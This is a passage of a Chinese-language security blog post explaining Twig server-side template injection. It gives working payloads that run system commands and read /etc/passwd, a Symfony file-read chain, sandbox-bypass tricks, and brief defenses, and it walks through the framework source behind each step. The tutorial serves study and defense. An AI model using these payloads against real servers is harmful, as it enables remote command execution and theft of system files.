+<h6 id="调用不存在的过滤器"><a href="#调用不存在的过滤器" class="headerlink" title="调用不存在的过滤器"></a>调用不存在的过滤器</h6><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>getFilter</code>这个方法用来获取一个过滤器实例。当 twig 试图获取一个名叫<code>cat /flag</code>的过滤器时，发现不存在这个过滤器。</li>
+<li>触发回调：因为找不到，twig 就会去调用上面注册好的回调函数并把过滤器的名字作为第一个参数传入。</li>
+</ul>
+<p>回到最开始的命令执行的样例：</p>
+<ol>
+<li><code>&#123;&#123;['id']|filter('system')&#125;&#125;</code></li>
+</ol>
+<ul>
+<li><code>[&#39;id&#39;]</code>：这是一个PHP数组。</li>
+<li><code>|filter(&#39;system&#39;)</code>：<code>filter</code>是 twig 的数组过滤器，作用是：对数组的每一个元素，都调用指定的回调函数进行过滤，返回过滤后的内容。</li>
+</ul>
+<ol start="2">
+<li><code>&#123;&#123;['cat /etc/passwd']|map('system')&#125;&#125;</code></li>
+</ol>
+<ul>
+<li><code>[&#39;cat /etc/passwd&#39;]</code>数组元素是一个完整的命令字符串。</li>
+<li><code>|map(&#39;system&#39;)</code>：<code>map</code>是 twig 中功能和<code>filter</code>类似的过滤器，作用是对数组中的每一个元素应用一个回调函数，并将该回调函数的返回值组成一个新数组。</li>
+</ul>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.read(<span class="number">1000</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这个payload常针对 <strong>Symfony 框架</strong>进行文件读取，利用框架在模板上下文中暴露的合法对象来实施攻击。</p>
+<p>简单来说，攻击者利用了 Symfony 的 <code>UploadedFile</code> 类作为跳板，凭空创建了一个指向系统敏感文件（如 <code>/etc/passwd</code>）的“文件句柄”，然后通过合法的读取方法将内容窃取出来。</p>
+<h5 id="流程拆解"><a href="#流程拆解" class="headerlink" title="流程拆解"></a>流程拆解</h5><h6 id="第一步：创建一个指向目标文件的“幽灵”对象"><a href="#第一步：创建一个指向目标文件的“幽灵”对象" class="headerlink" title="第一步：创建一个指向目标文件的“幽灵”对象"></a>第一步：创建一个指向目标文件的“幽灵”对象</h6><ul>
+<li><code>app.request.files</code>：这是 Symfony 在处理 HTTP 请求时，用于存放上传文件信息（<code>UploadedFile</code>对象）的集合。</li>
+<li><code>.get(1)</code>：获取文件集合中的某个元素。这里攻击者并不关心具体是哪个上传文件，只是需要拿到一个<code>UploadedFile</code>类的实例。</li>
+<li><code>.__construct(&#39;/etc/passwd&#39;,&#39;&#39;)</code>：这是整个攻击链的核心与关键。它直接调用了<code>UploadedFile</code>类的构造方法，并传入两个参数：<ul>
+<li><code>/etc/passwd</code>：读取的文件</li>
+<li><code>&#39;&#39;</code>：原始文件名。</li>
+</ul>
+</li>
+</ul>
+<p>这里结合 Symfony 源码来探究为什么<code>&#123;&#123; app.request.files.get(1) &#125;&#125;</code>能获取到<code>UploadedFile</code>实例：</p>
+<ol>
+<li>起点：<code>app</code>全局变量</li>
+</ol>
+<p>在 Symfony 的 Twig 模板中，<code>app</code>是一个全局可用的变量，它是 <code>AppVariable</code> 类的一个实例。这个类可以理解为模板中的”服务容器”，负责暴露框架的核心组件供模板调用。其中，<code>app.request</code> 属性会返回当前 HTTP 请求的 <code>Request</code> 对象。</p>
+<ol start="2">
+<li>第一层：<code>app.request</code>获取<code>Request</code>对象</li>
+</ol>
+<p><code>app.request</code> 返回的是一个 <code>Symfony\Component\HttpFoundation\Request</code> 类的实例。这个类封装了所有的 HTTP 请求数据.</p>
+<p>在 Request 类的源码中，它的构造函数接收一个 <code>$files</code> 参数（类型是 <code>FileBag</code>），并赋值给 <code>$this-&gt;files</code> 属性。简化的构造逻辑如下：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Symfony\Component\HttpFoundation\Request</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$files</span>; <span class="comment">// 类型是 FileBag</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">..., <span class="variable">$files</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">new</span> <span class="title class_">FileBag</span>(<span class="variable">$files</span>); <span class="comment">// 初始化 files 属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这意味着，通过 <code>app.request.files</code>，我们就拿到了一个 <code>FileBag</code> 对象。</p>
+<ol start="3">
+<li>第二层：<code>.files</code>获取 <code>FileBag</code> 对象</li>
+</ol>
+<p><code>FileBag</code>类专门负责管理上传的文件。它的构造函数接收一个包含上传文件信息的数组，并调用 <code>replace</code>和 <code>add</code>方法进行处理：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Symfony\Component\HttpFoundation\FileBag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileBag</span> <span class="keyword">extends</span> <span class="title">ParameterBag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">replace</span>(<span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$files</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>它继承自 <code>ParameterBag</code>，因此具备了 <code>get($key)</code> 等方法，可以通过键名来获取内部的元素。</p>
+<ol start="4">
+<li>第三层：<code>.get(1)</code>触发 <code>convertFileInformation</code> 获取<code>UploadedFile</code>实例</li>
+</ol>
+<p><code>FileBag</code>的<code>set</code>方法在被调用时，会自动调用一个内部方法<code>convertFileInformation</code>，将原始的上传文件信息转换成<code>UploadedFile</code>对象。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Symfony\Component\HttpFoundation\FileBag</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">convertFileInformation</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> <span class="keyword">instanceof</span> UploadedFile) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... 对 $_FILES 格式的数据进行修复和转换</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">UploadedFile</span>(</span><br><span class="line">        <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], </span><br><span class="line">        <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>], </span><br><span class="line">        <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>], </span><br><span class="line">        <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>], </span><br><span class="line">        <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>因此，当调用<code>.get(1)</code>时，实际上是从<code>FileBag</code>对象的参数存储中，取出了一个已经被 <code>convertFileInformation</code>方法实例化好的 <code>UploadedFile</code> 对象。</p>
+<p>下面是两个关键的类：</p>
+<ol>
+<li><code>Symfony\Component\HttpFoundation\File\UploadedFile</code>的构造函数</li>
+</ol>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件位置: vendor/symfony/http-foundation/File/UploadedFile.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadedFile</span> <span class="keyword">extends</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$originalName</span>, <span class="variable">$mimeType</span> = <span class="literal">null</span>, <span class="variable">$size</span> = <span class="literal">null</span>, <span class="variable">$error</span> = <span class="literal">null</span>, <span class="variable">$test</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ... 省略一些初始化和检查 ...</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;originalName = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getName</span>(<span class="variable">$originalName</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mimeType = <span class="variable">$mimeType</span> ?: <span class="string">&#x27;application/octet-stream&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$size</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;error = <span class="variable">$error</span> ?: UPLOAD_ERR_OK;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = (<span class="keyword">bool</span>) <span class="variable">$test</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [✓] 关键点1：调用了父类 File 的构造函数，并将 $path 传递过去</span></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$path</span>, UPLOAD_ERR_OK === <span class="variable">$this</span>-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在这个构造函数中，攻击者传入的<code>/etc/passwd</code>被赋值给了<code>$path</code>参数。然后，它通过 <code>parent::__construct($path, ...)</code>将这个路径传递给了它的父类 <code>File</code>。</p>
+<ol start="2">
+<li>父类<code>Symfony\Component\HttpFoundation\File\File</code>的构造函数</li>
+</ol>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件位置: vendor/symfony/http-foundation/File/File.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> \<span class="title">SplFileInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$checkPath</span> = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$checkPath</span> &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [✓] 关键点2：最终调用了 PHP 原生 SplFileInfo 类的构造函数</span></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在这里，Symfony 的 <code>File</code> 类又将 <code>$path</code>（即 <code>/etc/passwd</code>）传递给了 PHP 内核的 <code>SplFileInfo</code> 类。<code>SplFileInfo</code> 是 PHP 中所有文件操作对象的基础，一旦它被指向某个路径，该对象就代表了这个文件，并拥有了操作该文件的方法。</p>
+<p>经过这些操作之后，<code>SplFileInfo</code>就被指向了<code>/etc/passwd</code>，接下来就是读取该文件。</p>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.read(<span class="number">1000</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>app.request.files.get(1)</code>获取到<code>UploadedFile</code>实例后，由于继承于<code>SplFileInfo</code>这个类，所以能调用其所有的公有方法，其中就有<code>openFile()</code>。payload中<code>openFile</code>在调用时没有加括号是因为在 twig 模板语法中调用无参数对象方法时括号可以省略。</p>
+<p><code>openFile()</code>的方法签名：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">SplFileObject</span> <span class="title class_">SplFileInfo</span>::<span class="variable constant_">openFile</span> ([ <span class="keyword">string</span> <span class="variable">$open_mode</span> = <span class="string">&quot;r&quot;</span> [, <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span> [, resource <span class="variable">$context</span> = <span class="literal">NULL</span> ]]] )</span><br></pre></td></tr></table></figure></div>
+
+<p>返回了一个<code>SplFileObject</code>对象。</p>
+<p><code>SplFileObject</code>是一个功能全面的文件操作类，它从 <code>SplFileInfo</code> 继承而来，并提供了读写文件内容的一系列方法。在payload中，调用这个对象的<code>read()</code>来读取对应字节数。</p>
+<h3 id="沙箱模式利用"><a href="#沙箱模式利用" class="headerlink" title="沙箱模式利用"></a>沙箱模式利用</h3><h4 id="使用内置过滤器链"><a href="#使用内置过滤器链" class="headerlink" title="使用内置过滤器链"></a>使用内置过滤器链</h4><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;,&#x27;</span>)&#125;&#125;</span><span class="language-xml">  //绕过黑名单检查</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>[&#39;id&#39;]|filter(&#39;system&#39;)</code>：这是攻击的核心步骤。<code>filter</code> 是一个合法的数组过滤器，用于筛选数组元素。正常情况下，它的参数应该是一个测试函数，但攻击者传入的是字符串 <code>&#39;system&#39;</code>。在特定条件下，Twig 会将这个字符串解析为 PHP 内置的 <code>system</code> 函数，并对数组中的每个元素（这里是字符串 <code>&#39;id&#39;</code>）调用它。这等效于在服务器上执行了 <code>system(&#39;id&#39;)</code> 命令。关键在于，<code>filter</code> 是合法的过滤器，而 <code>&#39;system&#39;</code> 只是它接受的字符串参数。某些不完善的沙盒规则可能只检查了 <code>&#123;&#123; system('id') &#125;&#125;</code> 这种直接的函数调用，却忽略了对 filter 参数的检查。</li>
+<li><code>|join(&#39;,&#39;)</code>：这部分起到伪装和辅助绕过的作用。<code>join</code> 也是一个合法的数组过滤器，作用是将数组元素拼接成字符串。</li>
+</ul>
+<h4 id="利用属性注入"><a href="#利用属性注入" class="headerlink" title="利用属性注入"></a>利用属性注入</h4><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.query.<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;id&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>app.request</code>获取<code>Request</code>对象。</p>
+<p><code>Request</code>类简化源码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Symfony\Component\HttpFoundation\Request</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 存储 GET 参数的 ParameterBag 对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$query</span> = [], ...</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 关键点：将 GET 参数数组封装成 ParameterBag 对象</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">ParameterBag</span>(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>访问 <code>.query</code> 时，返回的是一个 <code>ParameterBag</code> 对象，它管理着所有的 URL 查询参数。</p>
+<p><code>ParameterBag</code> 类的 <code>filter</code> 方法：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Symfony\Component\HttpFoundation\ParameterBag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParameterBag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 存储参数的数组</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$parameters</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤某个参数的值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key     参数名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed  $default 默认值（如果参数不存在）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int    $filter  过滤器常量（如 FILTER_VALIDATE_EMAIL）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed  $options 过滤器选项</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 获取参数的值，如果不存在则使用 $default</span></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键点：这里调用了 PHP 原生的 filter_var 函数</span></span><br><span class="line">        <span class="comment">// 并且把用户可控的 $filter 和 $value 都传了进去</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, <span class="variable">$filter</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 如果参数存在，返回其值；否则返回默认值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$key</span>, <span class="variable">$this</span>-&gt;parameters) ? <span class="variable language_">$this</span>-&gt;parameters[<span class="variable">$key</span>] : <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>它内部直接调用了 PHP 的 <code>filter_var</code> 函数，并将 <code>$value</code>（待过滤的值）和 <code>$filter</code>（过滤器）原封不动地传递过去。</p>
+<p><strong>漏洞成因</strong>：<code>filter_var</code>方法假设 <code>$filter</code> 参数一定是一个整数常量（如 FILTER_VALIDATE_EMAIL），但实际上 PHP 的 filter_var 函数也接受回调函数名作为过滤器。</p>
+<p>PHP 原生的 <code>filter_var</code> 函数</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP 内核函数（C 语言实现，此处为行为等效的 PHP 伪代码）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_var</span>(<span class="params"><span class="variable">$variable</span>, <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 情况1：$filter 是一个整数常量（正常用法）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_int</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="comment">// 根据常量 ID 执行对应的过滤逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">php_filter</span>(<span class="variable">$variable</span>, <span class="variable">$filter</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 情况2：$filter 是一个回调函数（Callable）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="comment">// 关键点：直接调用该回调函数，并把 $variable 作为参数传入</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$variable</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$variable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>PHP 官方文档明确说明：<code>filter_var</code> 的 <code>$filter</code> 参数可以是一个回调函数（Callable）。</p>
+<p>当传入字符串 <code>&#39;system&#39;</code> 时，PHP 的可变函数（Variable Function）机制会将其解析为系统命令执行函数 <code>system()</code>。</p>
+<p>于是，<code>filter_var(&#39;id&#39;, &#39;system&#39;)</code> 等效于 <code>system(&#39;id&#39;)</code>，导致命令执行。</p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ol>
+<li>启用沙箱</li>
+</ol>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$policy</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Sandbox\SecurityPolicy</span>([], [], [], [], []);</span><br><span class="line"><span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">addExtension</span>(<span class="keyword">new</span> <span class="title class_">\Twig\Extension\SandboxExtension</span>(<span class="variable">$policy</span>, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>输入过滤：避免用户输入直接控制模板内容。</li>
+<li>禁用危险函数：在php.ini中禁用<code>system</code>、<code>exec</code>等函数。</li>
+</ol>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;sy&#x27;</span>~<span class="string">&#x27;stem&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="利用attribute函数"><a href="#利用attribute函数" class="headerlink" title="利用attribute函数"></a>利用<code>attribute</code>函数</h3><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">attribute</span>(_self, <span class="string">&#x27;env&#x27;</span>)&#125;&#125;</span><span class="language-xml">  <span class="comment">&lt;!-- 访问受限属性 --&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>在 Twig 中，<code>attribute</code> 函数用于动态地访问一个对象的属性或方法。</p>
+<p>基本语法：</p>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">attribute</span>(object, method) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="name">attribute</span>(object, method, arguments) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="name">attribute</span>(object, property) &#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SSTI之twig</li>
+        <li><strong>Author:</strong> SoloWalker</li>
+        <li><strong>Created at
+                :</strong> 2026-04-11 00:00:00</li>
+        
+            <li>
+                <strong>Updated at
